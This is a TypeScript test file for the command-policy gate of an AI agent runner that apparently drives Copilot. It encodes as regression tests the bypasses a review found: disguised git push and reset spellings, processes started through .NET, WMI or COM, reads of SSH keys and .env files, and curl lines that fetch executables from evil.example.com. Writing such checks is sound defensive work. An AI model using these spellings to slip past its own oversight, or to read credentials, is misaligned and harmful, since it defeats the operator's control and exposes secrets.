/**
 * Ways past the step gate found by the third review (2026-11-20), as assertions that fail — each one a spelling the rule
 * it got past did not read, and next to it the honest lines the fix must keep open:
 *
 * - git writes: `git.exe push`, `git "push"`, an option the deny pattern does not list (`--no-optional-locks`, `-P`),
 *   a splat (`git @a`), git started by Start-Process, and `cmd /c "git.exe push"`;
 * - a splat read as a word: `$a=@('group','delete',…); az @a list` read as az's `list`, with az read only;
 * - the allowlist: a program started through .NET, WMI or COM, by Start-Process given a variable, or by cmd's
 *   `for /f … in ('…')`;
 * - paths from the root of the drive (`\Users\x\.ssh\id_rsa`, `/Users/x`) and on another drive (`D:x.txt`, `cd D:`);
 * - a script the bot wrote, run as `pwsh .\tools\fix.ps1` or `node tools\fix`;
 * - a download Settings run without asking that also runs a script the bot wrote, whose card it skipped;
 * - and "Run this and the rest": the step whose card the operator pressed is not refused as one nobody read.
 *
 * And, from the same review, what kept work from going on, or went on unsaid:
 *
 * - a local API call with an e-mail address in its body, held as a download;
 * - `npm test` without its `pretest`, nothing said;
 * - a list of processes that could not be read, taken for "nothing left running";
 * - and what Copilot is told against what the runner does: git in the operator's chat, a script "written in one step and
 *   run in the next" that is then refused, "committed" where nothing is, a push "with the operator's word", a reviewer
 *   told to end "blocked".
 *
 *   npm run check:bypass
 */
import { rmSync } from 'node:fs';
import { mkdtemp, mkdir, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join, win32 } from 'node:path';
import { Tally } from './support/harness.js';
import { commandRefusal, staticCheck, type PolicyConfig, type PolicyDecision } from '../src/exec/policy.js';
import { chatDenyPatterns, RunConfigSchema } from '../src/config/schema.js';
import { programRefusal } from '../src/exec/programs.js';
import { readOnlyVerdict } from '../src/exec/readOnly.js';
import { confinementRefusal, type Confinement } from '../src/exec/confinement.js';
import { makeAuthorizer, type HeldFor } from '../src/exec/authorizer.js';
import { DEFAULT_SCRIPT_RULES } from '../src/exec/scriptKinds.js';
import type { Shell } from '../src/exec/shells.js';
import { networkFetchReason } from '../src/exec/network.js';
import * as npmScripts from '../src/exec/npmScripts.js';
import * as processes from '../src/exec/processes.js';
import { readFileSync } from 'node:fs';
import { parseReply } from '../src/protocol/parser.js';
import { ownScriptRefusal } from '../src/exec/scriptFiles.js';
import { whyItStopped } from '../src/session/compose.js';
import * as review from '../src/orchestrator/review.js';
import type { Step } from '../src/protocol/replySchema.js';

const t = new Tally();
const tmp = await mkdtemp(join(tmpdir(), 'cop-bypass-'));
process.once('exit', () => rmSync(tmp, { recursive: true, force: true }));
const shipped = RunConfigSchema.parse({}).execution;
const step = (cmd: string, shell: Shell = 'pwsh'): Step => ({ id: 1, type: 'command', shell, cmd });
const short = (s: string | null | undefined): string => (s ?? 'null').slice(0, 200);

try {
  console.log('--- git writes, however git and its subcommand are spelled ---');
  const deny = shipped.denyPatterns;
  const writes = [
    'git.exe push origin HEAD',
    'git "push" origin HEAD',
    "git 'reset' --hard HEAD~1",
    'git --no-optional-locks push origin HEAD',
    'git -P push',
    'git --no-optional-locks clean -fdx',
    "$a = @('push', 'origin', 'HEAD'); git @a",
    '$sub = "push"; git $sub origin HEAD',
    'Start-Process git -ArgumentList "push origin HEAD" -Wait',
    "& 'C:\\Program Files\\Git\\cmd\\git.exe' push origin HEAD",
    'cmd /c "git.exe push origin HEAD"',
    'git.exe branch -D feature',
    '$f = "-D"; git branch $f feature',
  ];
  for (const cmd of writes) {
    const r = commandRefusal(cmd, 'pwsh', deny);
    t.truthy(`refused as a git write: ${cmd}`, r !== null && /list of refused commands/.test(r), short(r));
  }
  t.truthy('refused in a cmd step too: git.exe "push"', /list of refused commands/.test(commandRefusal('git.exe "push" origin HEAD', 'cmd', deny) ?? ''), 'not refused');
  const reads = ['git.exe status', 'git -P log --oneline -5', 'git --no-optional-locks status --short', 'git "log" -1 --format=%H', 'git.exe diff HEAD~1 --stat', 'git branch --show-current', 'git log --grep="reset"'];
  for (const cmd of reads) t.check(`left open, it only reads: ${cmd}`, commandRefusal(cmd, 'pwsh', deny), null);
  // In the workbench's chat the operator's own git writes run; push and reset are still refused.
  const chat = chatDenyPatterns(deny);
  t.check('in the chat: git.exe commit runs', commandRefusal('git.exe commit -m "x"', 'pwsh', chat), null);
  t.check('in the chat: git -P switch -c topic runs', commandRefusal('git -P switch -c topic', 'pwsh', chat), null);
  t.truthy('in the chat: git.exe push is refused', /list of refused commands/.test(commandRefusal('git.exe push', 'pwsh', chat) ?? ''), 'not refused');
  t.truthy('in the chat: git "reset" --hard is refused', /list of refused commands/.test(commandRefusal('git "reset" --hard', 'pwsh', chat) ?? ''), 'not refused');
  t.truthy('in the chat: git @a is refused', /list of refused commands/.test(commandRefusal('$a=@("push"); git @a', 'pwsh', chat) ?? ''), 'not refused');
  // A list the operator emptied of git rules is theirs: nothing here adds them back.
  t.check('a deny list with no git rule refuses no git', commandRefusal('git.exe push', 'pwsh', ['Remove-Item[^|]*-Recurse']), null);

  console.log('\n--- a splat is a word known only when it runs ---');
  const azDelete = "$a = @('group', 'delete', '-n', 'rg', '--yes'); az @a list";
  const verdict = readOnlyVerdict(azDelete, 'pwsh', ['az']);
  t.truthy('az @a list, az read only: not read as only reading', verdict !== null && verdict.kind !== 'reads', JSON.stringify(verdict));
  t.check('az vm list, az read only: reads', readOnlyVerdict('az vm list -o table', 'pwsh', ['az'])?.kind, 'reads');
  t.check('npm install -D @types/node: a scoped package, not a splat', programRefusal('npm install -D @types/node @angular/cli', ['npm']), null);
  t.check('an az read with a scoped-looking word stays a read', readOnlyVerdict('az vm list --query "[?name==\'x\']"', 'pwsh', ['az'])?.kind, 'reads');

  console.log('\n--- the allowlist: programs started where no command head is ---');
  const list = ['node', 'npm', 'git', 'cmd', 'pwsh'];
  const unseen = [
    "[Diagnostics.Process]::Start('nmap', '-sV host')",
    "[System.Diagnostics.Process]::Start('nmap')",
    "$si = New-Object System.Diagnostics.ProcessStartInfo 'nmap'; [void]$si",
    "$p = 'nmap'; Start-Process $p -ArgumentList '-sV host'",
    'Start-Process -FilePath $exe',
    "Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = 'nmap' }",
    "(New-Object -ComObject WScript.Shell).Run('nmap')",
  ];
  for (const cmd of unseen) t.truthy(`refused: ${cmd}`, programRefusal(cmd, list) !== null, 'not refused');
  t.truthy("cmd: for /f %i in ('nmap -sV host') do @echo %i is refused", programRefusal("for /f %i in ('nmap -sV host') do @echo %i", list, 'cmd') !== null, 'not refused');
  t.truthy('cmd: for /f "usebackq" %i in (`nmap x`) do @echo %i is refused', programRefusal('for /f "usebackq" %i in (`nmap x`) do @echo %i', list, 'cmd') !== null, 'not refused');
  for (const [cmd, shell] of [
    ["for /f %i in ('dir /b') do @echo %i", 'cmd'],
    ['for %f in (*.ts) do @echo %f', 'cmd'],
    ["for /f %i in ('git rev-parse HEAD') do @echo %i", 'cmd'],
    ['Start-Process node -ArgumentList server.js', 'pwsh'],
    ['Get-CimInstance Win32_Process | Select-Object Name', 'pwsh'],
  ] as const) {
    t.check(`left open: ${cmd}`, programRefusal(cmd, list, shell), null);
  }

  console.log('\n--- paths written from the root of a drive ---');
  const project: Confinement = { roots: [tmp], cwd: tmp };
  const outsideLines = [
    'Get-Content \\Users\\someone\\.ssh\\id_rsa',
    'Get-ChildItem /Users -Recurse -Filter *.env',
    'Get-Content "\\Windows\\System32\\drivers\\etc\\hosts"',
    'type /Windows/win.ini',
    'Get-Content D:x.txt',
    'Set-Location D:; Get-ChildItem',
    'cd Z:',
  ];
  for (const cmd of outsideLines) {
    const r = confinementRefusal(cmd, project);
    t.truthy(`refused, outside the project: ${cmd}`, r !== null && /outside the project|only inside the project/.test(r), short(r));
  }
  const inside = win32.resolve(tmp).slice(2);
  const openLines = [
    `Get-Content ${inside}\\a.txt`,
    "Select-String -Pattern '\\d+' a.ts",
    "$p.Replace('\\', '/')",
    'msbuild app.sln /p:Configuration=Release /t:Build /nologo',
    'dir /s /b',
    'findstr /i todo *.ts',
    'curl http://localhost:3000/api/users',
    'node server.js --route /api/users',
    "node -e \"const a = { c: 1, d: 2 }\"",
    `Set-Location ${win32.resolve(tmp).slice(0, 2)}`,
  ];
  for (const cmd of openLines) t.check(`left open: ${cmd}`, confinementRefusal(cmd, project), null);

  console.log('\n--- a script the bot wrote, run without -File or without its extension ---');
  await mkdir(join(tmp, 'tools'), { recursive: true });
  await mkdir(join(tmp, 'app'), { recursive: true });
  const began = new Date(Date.now() - 60_000).toISOString();
  await writeFile(join(tmp, 'tools', 'fix.ps1'), 'Write-Output "fixed"\n');
  await writeFile(join(tmp, 'tools', 'fix.js'), 'console.log("fixed")\n');
  await writeFile(join(tmp, 'app', 'index.js'), 'console.log("app")\n');
  const during: Confinement = { roots: [tmp], cwd: tmp, workStartedAt: began };
  const cfg: PolicyConfig = { mode: 'confirm', denyPatterns: deny, allowedPrograms: [], scripts: DEFAULT_SCRIPT_RULES };
  for (const cmd of ['pwsh .\\tools\\fix.ps1', 'powershell -NoProfile -ExecutionPolicy Bypass .\\tools\\fix.ps1', 'pwsh -NoLogo tools/fix.ps1', 'node tools\\fix', 'node tools/fix', 'node app', 'node .\\app']) {
    const d = staticCheck(step(cmd), cfg, process.env, during);
    t.truthy(`refused as a script written during the work: ${cmd}`, d?.action === 'skip' && /written during|not one of the project's own/.test(d.reason), d ? short(d.action === 'run' ? 'run' : d.reason) : 'it would run');
  }
  const before: Confinement = { roots: [tmp], cwd: tmp, workStartedAt: new Date(Date.now() + 60_000).toISOString() };
  for (const cmd of ['node tools\\fix', 'node app', 'node --version', 'pwsh -NoProfile -Command Get-Date', 'node --test']) {
    t.check(`left open, the project's own or no file: ${cmd}`, staticCheck(step(cmd), cfg, process.env, before), null);
  }

  console.log("\n--- a download Settings run without asking still waits for a bot script's card ---");
  const held: HeldFor[] = [];
  const unattended: PolicyConfig = {
    mode: 'unattended',
    denyPatterns: deny,
    allowedPrograms: ['curl', 'pwsh', 'node'],
    isolation: 'separate-account',
    networkFetch: 'run',
    scripts: { ...DEFAULT_SCRIPT_RULES, ps1: { own: true, written: true } },
    writtenScripts: 'ask',
  };
  const auth = makeAuthorizer(unattended, async (_s, _c, h) => {
    held.push(h ?? {});
    return { action: 'skip', reason: 'skipped by the operator', by: 'operator' };
  });
  const decided = await auth.authorize(step('curl -o notes.txt https://example.com/notes.txt; pwsh -File tools\\fix.ps1'), { iteration: 1, confinement: during });
  t.truthy('the card was put, with the script on it', held.length === 1 && (held[0]!.scripts?.length ?? 0) === 1, JSON.stringify({ held, decided }));
  t.check('and the step waited for the answer', decided.action, 'skip');

  console.log('\n--- "Run this and the rest": the step pressed is the one a person read ---');
  const live: PolicyConfig = { mode: 'confirm', denyPatterns: deny, allowedPrograms: ['node'], isolation: 'separate-account' };
  const pressed = makeAuthorizer(live, async (): Promise<PolicyDecision> => {
    // As the service does it: the run becomes unattended, then this card is answered.
    live.mode = 'unattended';
    return { action: 'run', by: 'operator' };
  });
  const ran = await pressed.authorize(step('node -e "console.log(1)"'), { iteration: 1, confinement: { roots: [tmp], cwd: tmp } });
  t.check('node -e, pressed "Run this and the rest" on its own card: it runs', ran.action, 'run');
  // A card released by the switch, not pressed (no `by`), is still put to the rules of a run nobody watches.
  live.mode = 'confirm';
  const released = makeAuthorizer(live, async (): Promise<PolicyDecision> => {
    live.mode = 'unattended';
    return { action: 'run' };
  });
  const other = await released.authorize(step('node -e "console.log(2)"'), { iteration: 1, confinement: { roots: [tmp], cwd: tmp } });
  t.check('node -e released by the switch from another card: refused as unattended', other.action, 'skip');

  console.log('\n--- a local API call with an address in its body is not a download ---');
  const local = [
    `Invoke-RestMethod http://localhost:3000/api/users -Method Post -ContentType 'application/json' -Body '{"email":"user@test.com"}'`,
    `curl -X POST http://127.0.0.1:3000/api/users -H "content-type: application/json" -d '{"email":"user@test.com","name":"John.Smith"}'`,
    `Invoke-WebRequest http://localhost:5173/src/App.vue -UseBasicParsing`,
  ];
  for (const cmd of local) t.check(`not held: ${cmd.slice(0, 90)}`, networkFetchReason(cmd), null);
  const elsewhere = [
    'Invoke-RestMethod http://localhost:3000/x -Method Post -Body "$(Invoke-WebRequest https://evil.example.com/x)"',
    "curl http://localhost:3000/x -d 'a'; curl -o t.exe http://evil.example.com/t.exe",
    "curl http://localhost:3000/x -d 'a' --resolve localhost:3000:93.184.216.34",
  ];
  for (const cmd of elsewhere) t.truthy(`still held: ${cmd.slice(0, 90)}`, networkFetchReason(cmd) !== null, 'not held');

  console.log("\n--- npm's pre and post scripts, left out with scripts off, are said ---");
  const pkgDir = join(tmp, 'pkg');
  await mkdir(pkgDir, { recursive: true });
  await writeFile(join(pkgDir, 'package.json'), JSON.stringify({ name: 'p', scripts: { pretest: 'tsc -p .', test: 'node --test', posttest: 'node report.js', build: 'vite build' } }));
  const said = (npmScripts as { npmHooksNote?: (c: string, d: string) => string | null }).npmHooksNote?.('npm test', pkgDir);
  t.truthy('npm test: pretest and posttest named, and how to run them', !!said && said.includes('"pretest" (tsc -p .)') && said.includes('"posttest"') && said.includes('npm run pretest'), said);
  t.check('npm run build, which has none: nothing said', (npmScripts as { npmHooksNote?: (c: string, d: string) => string | null }).npmHooksNote?.('npm run build', pkgDir), null);
  t.check('yarn test, which runs them: nothing said', (npmScripts as { npmHooksNote?: (c: string, d: string) => string | null }).npmHooksNote?.('yarn test', pkgDir), null);

  console.log('\n--- a list of processes that cannot be read is not "nothing left running" ---');
  (processes as { setProcessTableQueryForChecks?: (q?: () => Promise<null>) => void }).setProcessTableQueryForChecks?.(async () => null);
  try {
    const reaped = await processes.reapLeftovers(tmp, { since: Date.now() - 1000, processes: [], listeners: [] });
    t.truthy('said as not read, not as nothing left', !!reaped.unread, JSON.stringify(reaped));
  } finally {
    (processes as { setProcessTableQueryForChecks?: (q?: () => Promise<null>) => void }).setProcessTableQueryForChecks?.();
  }

  console.log('\n--- what Copilot is told agrees with what the runner does ---');
  const prompt = (name: string): string => readFileSync(join(import.meta.dirname, '..', 'prompts', name), 'utf8');
  t.truthy("level 1's git rule says where the runner allows git itself — the operator's chat", /The one exception is the runner's own/.test(prompt('level1.md')), '');
  t.truthy('the reviewer is not told to write a file and run it in the next step', !/run it in the next step/.test(prompt('review1.md')), '');
  const fileStep = parseReply('```json\n' + JSON.stringify({ status: 'continue', notes: 'x', steps: [{ id: 1, type: 'file', cmd: 'x' }] }) + '\n```', { stopMarker: '', defaultShell: 'pwsh' });
  t.truthy('a step of another type: told to put it in the command, not to run a file in the next step', !fileStep.ok && !/in the next/.test(fileStep.detail) && /several lines/.test(fileStep.detail), fileStep.ok ? 'parsed' : fileStep.detail);
  const sameLine = ownScriptRefusal("Set-Content tools\\once.js 'console.log(1)'; node tools\\once.js", tmp, began, 'pwsh', { rules: DEFAULT_SCRIPT_RULES });
  t.truthy('written and run in one line, under the default boxes: not told to run it in the next step', !!sameLine && !/in the next/.test(sameLine), sameLine);
  const allowed = ownScriptRefusal("Set-Content tools\\once.js 'console.log(1)'; node tools\\once.js", tmp, began, 'pwsh', { rules: { ...DEFAULT_SCRIPT_RULES, js: { own: true, written: true } } });
  t.truthy('where the box lets it run: told to run it in the next step', !!allowed && /in the next/.test(allowed), allowed);
  const interrupted = { how: 'interrupted' as const, fromAttempt: 1 };
  t.truthy('carried on in the chat: not told its changes were committed', !/committed/.test(whyItStopped(interrupted as never, false)), whyItStopped(interrupted as never, false));
  t.truthy('carried on on a branch of its own: told they were', /committed on this branch/.test(whyItStopped(interrupted as never, true)), '');
  t.truthy("the lead and Kerrigan: a push is never theirs, not with anyone's word", !/pushed to a remote, without/.test(prompt('lead1.md')) && !/pushed to a remote, without/.test(prompt('kerrigan1.md')) && /never a push/.test(prompt('lead1.md')) && /never a push/.test(prompt('kerrigan1.md')), '');
  const outsideReason = confinementRefusal('Get-Content \\Users\\someone\\.ssh\\id_rsa', project) ?? '';
  t.truthy('a refusal told to the reviewer: no "end blocked", a finding instead', /blocked/.test(outsideReason) && !/blocked/.test(((review as { forTheReviewer?: (r: string) => string }).forTheReviewer ?? ((r: string) => r))(outsideReason)) && /in a finding/.test(((review as { forTheReviewer?: (r: string) => string }).forTheReviewer ?? ((r: string) => r))(outsideReason)), ((review as { forTheReviewer?: (r: string) => string }).forTheReviewer ?? ((r: string) => r))(outsideReason));
} catch (e) {
  t.truthy('ran without throwing', false, (e as Error).stack ?? String(e));
}
t.finish();
